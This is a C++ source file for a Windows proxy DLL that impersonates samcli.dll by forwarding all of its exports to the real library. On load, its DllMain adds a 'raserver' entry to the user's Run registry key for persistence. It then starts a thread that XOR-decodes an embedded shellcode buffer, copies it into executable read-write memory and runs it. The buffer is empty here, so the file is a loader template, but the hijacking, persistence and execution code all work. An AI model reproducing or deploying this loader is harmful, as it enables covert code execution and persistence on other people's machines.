#include "pch.h"
#include <windows.h>
#include <Shellapi.h>
#include <stdio.h>
#include <thread>
#include <direct.h>
#define GetCurrentDir _getcwd
#define RUN_KEY "Software\\Microsoft\\Windows\\CurrentVersion\\Run"
#pragma comment(linker, "/export:NetGetDisplayInformationIndex=C:\\Windows\\System32\\samcli.NetGetDisplayInformationIndex")
#pragma comment(linker, "/export:NetGroupAdd=C:\\Windows\\System32\\samcli.NetGroupAdd")
#pragma comment(linker, "/export:NetGroupAddUser=C:\\Windows\\System32\\samcli.NetGroupAddUser")
#pragma comment(linker, "/export:NetGroupDel=C:\\Windows\\System32\\samcli.NetGroupDel")
#pragma comment(linker, "/export:NetGroupDelUser=C:\\Windows\\System32\\samcli.NetGroupDelUser")
#pragma comment(linker, "/export:NetGroupEnum=C:\\Windows\\System32\\samcli.NetGroupEnum")
#pragma comment(linker, "/export:NetGroupGetInfo=C:\\Windows\\System32\\samcli.NetGroupGetInfo")
#pragma comment(linker, "/export:NetGroupGetUsers=C:\\Windows\\System32\\samcli.NetGroupGetUsers")
#pragma comment(linker, "/export:NetGroupSetInfo=C:\\Windows\\System32\\samcli.NetGroupSetInfo")
#pragma comment(linker, "/export:NetGroupSetUsers=C:\\Windows\\System32\\samcli.NetGroupSetUsers")
#pragma comment(linker, "/export:NetLocalGroupAdd=C:\\Windows\\System32\\samcli.NetLocalGroupAdd")
#pragma comment(linker, "/export:NetLocalGroupAddMember=C:\\Windows\\System32\\samcli.NetLocalGroupAddMember")
#pragma comment(linker, "/export:NetLocalGroupAddMembers=C:\\Windows\\System32\\samcli.NetLocalGroupAddMembers")
#pragma comment(linker, "/export:NetLocalGroupDel=C:\\Windows\\System32\\samcli.NetLocalGroupDel")
#pragma comment(linker, "/export:NetLocalGroupDelMember=C:\\Windows\\System32\\samcli.NetLocalGroupDelMember")
#pragma comment(linker, "/export:NetLocalGroupDelMembers=C:\\Windows\\System32\\samcli.NetLocalGroupDelMembers")
#pragma comment(linker, "/export:NetLocalGroupEnum=C:\\Windows\\System32\\samcli.NetLocalGroupEnum")
#pragma comment(linker, "/export:NetLocalGroupGetInfo=C:\\Windows\\System32\\samcli.NetLocalGroupGetInfo")
#pragma comment(linker, "/export:NetLocalGroupGetMembers=C:\\Windows\\System32\\samcli.NetLocalGroupGetMembers")
#pragma comment(linker, "/export:NetLocalGroupSetInfo=C:\\Windows\\System32\\samcli.NetLocalGroupSetInfo")
#pragma comment(linker, "/export:NetLocalGroupSetMembers=C:\\Windows\\System32\\samcli.NetLocalGroupSetMembers")
#pragma comment(linker, "/export:NetQueryDisplayInformation=C:\\Windows\\System32\\samcli.NetQueryDisplayInformation")
#pragma comment(linker, "/export:NetUserAdd=C:\\Windows\\System32\\samcli.NetUserAdd")
#pragma comment(linker, "/export:NetUserChangePassword=C:\\Windows\\System32\\samcli.NetUserChangePassword")
#pragma comment(linker, "/export:NetUserDel=C:\\Windows\\System32\\samcli.NetUserDel")
#pragma comment(linker, "/export:NetUserEnum=C:\\Windows\\System32\\samcli.NetUserEnum")
#pragma comment(linker, "/export:NetUserGetGroups=C:\\Windows\\System32\\samcli.NetUserGetGroups")
#pragma comment(linker, "/export:NetUserGetInfo=C:\\Windows\\System32\\samcli.NetUserGetInfo")
#pragma comment(linker, "/export:NetUserGetLocalGroups=C:\\Windows\\System32\\samcli.NetUserGetLocalGroups")
#pragma comment(linker, "/export:NetUserModalsGet=C:\\Windows\\System32\\samcli.NetUserModalsGet")
#pragma comment(linker, "/export:NetUserModalsSet=C:\\Windows\\System32\\samcli.NetUserModalsSet")
#pragma comment(linker, "/export:NetUserSetGroups=C:\\Windows\\System32\\samcli.NetUserSetGroups")
#pragma comment(linker, "/export:NetUserSetInfo=C:\\Windows\\System32\\samcli.NetUserSetInfo")
#pragma comment(linker, "/export:NetValidatePasswordPolicy=C:\\Windows\\System32\\samcli.NetValidatePasswordPolicy")
#pragma comment(linker, "/export:NetValidatePasswordPolicyFree=C:\\Windows\\System32\\samcli.NetValidatePasswordPolicyFree")
void Hook_Init();
std::thread hookthread;

char shellcode[] = "";

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
{
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH: {

		// Create a thread and close the handle as we do not want to use it to wait for it 
		char path[200];
		_getcwd(path, 200);
		HKEY hkey = NULL;
		strcat_s(path, "\\raserver.exe");
		const char* exe = path;
		// startup
		LONG res = RegOpenKeyEx(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hkey);
		if (res == ERROR_SUCCESS) {
			char value[255] = { 0 };
			DWORD BufferSize = 255;
			RegGetValue(HKEY_CURRENT_USER, (LPCSTR)"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "raserver", RRF_RT_ANY, NULL, (PVOID)&value, &BufferSize);
			if (value[0] != 0) {
			}
			else {
				RegSetValueEx(hkey, (LPCSTR)"raserver", 0, REG_SZ, (unsigned char*)exe, strlen(exe));
			}
			RegCloseKey(hkey);
		}
		hookthread = std::thread(Hook_Init);

	}
	case DLL_PROCESS_DETACH:
		hookthread.detach();
		// Code to run when the DLL is freed
		break;

	case DLL_THREAD_ATTACH:
		// Code to run when a thread is created during the DLL's lifetime
		break;
	case DLL_THREAD_DETACH:
		// Code to run when a thread ends normally.
		break;
	}
	return TRUE;
}

void Hook_Init()
{
	char key[] = "aeyp^cc9boQEoHdq";
	int keySize = sizeof(key);
	int i;
	for (i = 0; i < sizeof(shellcode); i++) {
		shellcode[i] = shellcode[i] ^ key[i % keySize];
	}
	void* pShellcode;
	HANDLE hProcess = GetCurrentProcess();

	pShellcode = VirtualAllocEx(hProcess, NULL, sizeof(shellcode), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
	memcpy(pShellcode, shellcode, sizeof(shellcode));

	int (*func)();
	func = (int (*)()) pShellcode;
	(*func)();
}
